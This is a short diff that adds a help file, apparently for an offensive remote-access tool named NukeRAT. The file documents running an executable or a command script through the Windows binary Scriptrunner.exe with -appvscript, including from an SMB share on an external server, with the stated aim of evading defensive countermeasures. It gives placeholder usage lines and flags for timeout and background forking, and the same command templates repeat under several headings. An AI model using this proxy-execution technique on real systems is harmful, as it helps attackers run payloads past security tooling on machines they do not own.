@@ -1,0 +1,21 @@
+ABOUT
+    Execute binary through proxy binary to evade defensive counter
+    measures. LOLBAS documents execute binary through proxy binary
+    to evade defensive counter measures and execute binary through
+    proxy binary from external server to evade defensive counter
+    measures.
+
+USAGE:
+    Scriptrunner.exe -appvscript {PATH:.exe}
+    ScriptRunner.exe -appvscript {PATH_SMB:.cmd}
+
+EXAMPLES:
+    Scriptrunner.exe -appvscript {PATH:.exe}
+    ScriptRunner.exe -appvscript {PATH_SMB:.cmd}
+
+NUKERAT FLAGS:
+    -w <seconds>    Maximum wait time until timeout
+    -bg             Fork and run without waiting for output
+
+    Example:
+    Scriptrunner.exe -appvscript {PATH:.exe}
